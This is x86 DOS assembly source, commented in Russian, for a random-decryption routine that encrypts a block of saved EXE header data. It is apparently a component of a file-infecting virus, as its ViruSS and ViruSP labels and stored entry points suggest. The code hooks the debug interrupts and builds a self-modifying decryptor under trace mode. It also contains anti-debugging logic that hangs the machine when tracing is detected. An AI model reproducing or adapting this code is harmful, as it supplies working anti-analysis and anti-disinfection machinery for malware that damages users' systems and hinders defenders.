;----------------------Random Decryption Algorithm-----------------------------
RandomCryptDecrypt PROC NEAR
		cli				;прерывания - долой
		push ds
		push es
		push 0
		pop ds
		mov ax,cs			;ставим свои int 1 и 3
		xchg ax,ds:[6]
		push ax
		lea ax,[bp+offset CryptDecrypt]
		xchg ax,ds:[4]
		push ax
		mov ax,cs
		xchg ax,ds:[0Eh]
		push ax
		lea ax,[bp+offset GetCRC32]
		xchg ax,ds:[0Ch]
		push ax
		push cs
		pop ds
		push cs
		pop es

		call WhatsFuck			;что делать бум?

		push 0
		pop ds
		pop word ptr ds:[0Ch]		;восстановим вектора 1 и 3
		pop word ptr ds:[0Eh]
		pop word ptr ds:[4]
		pop word ptr ds:[6]
		pop es
		pop ds
		sti				;прерывания - разрешены
		ret
		
WhatsFuck:	or bp,bp			;bp = 0 - криптуем
		jz CryptCureData
		jmp DecryptCureData

;------------------------------------------------------------------------------
;------------------------ Cryptor for cure data (RDA) -------------------------
;------------------------------------------------------------------------------
CryptCureData:	mov cx,100h			;перемешаем команды в таблицах

MixCommands:	mov ax,10h
		call Rnd
		shl ax,1
		xchg si,ax
		mov ax,10h
		call Rnd
		shl ax,1
		xchg di,ax

		test si,2
		jnz SetBit_No1
		and di,1Dh
		jmp XchgCommands
SetBit_No1:	or di,2

XchgCommands:	mov ax,ds:[di+offset MainTable]
		xchg ax,ds:[si+offset MainTable]
		mov ds:[di+offset MainTable],ax
		xor si,2
		xor di,2
		neg si
		neg di
		mov ax,ds:[di+offset MirrorTable+1Eh]
		xchg ax,ds:[si+offset MirrorTable+1Eh]
		mov ds:[di+offset MirrorTable+1Eh],ax
		loop MixCommands

MakeCryptor:	int 3				;считаем CRC
		mov word ptr ds:[offset CheckSum],ax
		mov word ptr ds:[offset CheckSum+2],dx

		call RandomWord			;создаем криптор
		mov si,offset MirrorTable
		call BuildDecryptor

		call RandomWord		;ax - crypt key
		mov word ptr ds:[offset MasterKey],ax

		mov si,offset CureData
		mov byte ptr ds:[offset Direction],4Bh	;dec bx
		mov cx,1Eh
		mov bx,offset CureMode-offset CureData+1

		pushf			;trace mode ON
		pop ax
		or ah,1
		push ax
		popf

		loop $			;декриптор ;)

		int 3			;считаем CRC и вырубаем трассировку

		cmp word ptr ds:[offset CheckSum],ax	;нормально закриптовал?
		jne GoodCrypted
		cmp word ptr ds:[offset CheckSum+2],dx
		je MakeCryptor

GoodCrypted:	mov di,offset DecryptorStart	;стираем криптор нафиг
		xor ax,ax
		mov cx,8
		cld
		rep stosw

		call CryptTables
		call RandomWord		;этим ключом криптуем таблицы 
		mov TableKey,ax
		jmp CryptTables



;------------------------------------------------------------------------------
;----------------------- Decryptor for cure data (RDA) ------------------------
;------------------------------------------------------------------------------
DecryptCureData:in ax,40h			;RND init
		mov word ptr ds:[bp+RndSeed],ax

BadCRC:		RndSeed EQU $+1
		mov ax,0
		mov dx,2CADh
		mul dx
		add ax,3619h
		mov word ptr ds:[bp+RndSeed],ax		;ax - rnd

		mov si,offset MainTable			;строим декриптор
		call BuildDecryptor

		lea si,[bp+offset CureData]
		mov byte ptr ds:[bp+offset Direction],43h	;inc bx
		mov cx,1Eh
		xor bx,bx

		pushf
		pop ax
		or ah,1
		push ax
		popf

		loop $

		int 3

		sub ax,ds:[bp+offset CheckSum]		;расшифровали?
		sub dx,ds:[bp+offset CheckSum+2]
		or ax,dx
		jz Decrypted

		mov dx,word ptr ds:[bp+RndSeed] 
		mov cx,10h
Mirrorize:	rcr dx,1
		rcl ax,1
		loop Mirrorize
		xchg al,ah

		mov si,offset MirrorTable		;строим криптор
		call BuildDecryptor

		lea si,[bp+offset CureData]
		mov byte ptr ds:[bp+offset Direction],4Bh	;dec bx
		mov cx,1Eh
		mov bx,offset CureMode-offset CureData+1

		pushf
		pop ax
		or ah,1
		push ax
		popf

		loop $					;вернем как было

		int 3

		jmp BadCRC				;эх раз, еще раз...

Decrypted:	ret

;------------------------------------------------------------------------------
CryptDecrypt:	push cx				;обработчик int 1
		MasterKey EQU $+1
		mov cx,0

DecryptorStart:
dw 8 dup (0)
DecryptorEnd:

Direction:	db 0

		mov word ptr ds:[bp+MasterKey],cx
		pop cx
		iret


;------------------------------------------------------------------------------
BuildDecryptor:	mov word ptr ds:[bp+ViruSS],ss
		mov word ptr ds:[bp+ViruSP],sp

		push cs
		pop ss
		lea sp,ds:[bp+si]
		lea si,ds:[bp+offset DecryptorEnd]

		mov cx,8

MakeDecryptor:	rcl ax,1
		jc Copy
		pop dx
		pop dx
		jmp InsertC

Copy:		pop dx
		inc sp
		inc sp

InsertC:	db 81h,0F2h			;xor dx,0
		TableKey dw 0

		xchg sp,si
		push dx
		xchg sp,si
		loop MakeDecryptor

		ViruSS EQU $+1
		mov bx,1234h
		mov ss,bx
		ViruSP EQU $+1
		mov sp,0
		ret

;------------------------------------------------------------------------------
CryptTables:	mov si,offset MainTable
		mov di,si
		mov cx,20h
		cld
CryptNext:	lodsw
		xor ax,word ptr ds:[TableKey]
		stosw
		loop CryptNext
		ret

;------------------------------------------------------------------------------
;Calculation CRC32 ax:dx=CRC32
;------------------------------------------------------------------------------
GetCRC32:	mov ax,0FFFFh
		mov dx,ax
		mov cx,1Ah*2
		mov si,2

NextByteCRC:	push cx

		mov bl,ds:[bp+si+offset CureData+2]
		mov cx,8

NextBit:	rcl bl,1
		rcl dx,1
		rcl ax,1
		jnc CarryOff
		xor ax,0EDB8h
		xor dx,8320h
CarryOff:	loop NextBit

		test si,8000h
		jnz ChangeSign
		inc si
ChangeSign:	neg si
		pop cx
		loop NextByteCRC

		push ds
		xchg bp,sp
		and byte ptr [bp+7],0FEh
		lds si,[bp+0Ah]
		xchg bp,sp
		cmp byte ptr ds:[si],0CFh
		je NoDebugger

		jmp $

NoDebugger:	pop ds
		iret

;---------------------------- Crypted area ------------------------------------
CureData:
CheckSum dd 0E4775D93h
EXE_IP dw 0
EXE_CS dw 0
EXE_SS dw 0
EXE_SP dw 0
DataAreaOffset dw 0
DataAreaSeg dw 0
CryptedAreaOffset dw 0
CryptedAreaSeg dw 0
CryptedAreaLen dw 0
Relocations dw 0
Key1 dw 0
Key2 dw 0
CureMode dw 82h
;---------------------------- Crypted area ------------------------------------


;-------------------------- Commands Tables -----------------------------------
MainTable:
xor byte ptr ds:[si+bx],cl
inc cl
add byte ptr ds:[si+bx],cl
dec cl
sub byte ptr ds:[si+bx],cl
inc ch
rol byte ptr ds:[si+bx],cl
dec ch
ror byte ptr ds:[si+bx],cl
add cl,ch
inc byte ptr ds:[si+bx]
sub cl,ch
dec byte ptr ds:[si+bx]
sub ch,cl
not byte ptr ds:[si+bx]
add ch,cl

MirrorTable:
not byte ptr ds:[si+bx]
sub ch,cl
inc byte ptr ds:[si+bx]
add ch,cl
dec byte ptr ds:[si+bx]
add cl,ch
rol byte ptr ds:[si+bx],cl
sub cl,ch
ror byte ptr ds:[si+bx],cl
inc ch
add byte ptr ds:[si+bx],cl
dec ch
sub byte ptr ds:[si+bx],cl
inc cl
xor byte ptr ds:[si+bx],cl
dec cl


RandomCryptDecrypt ENDP
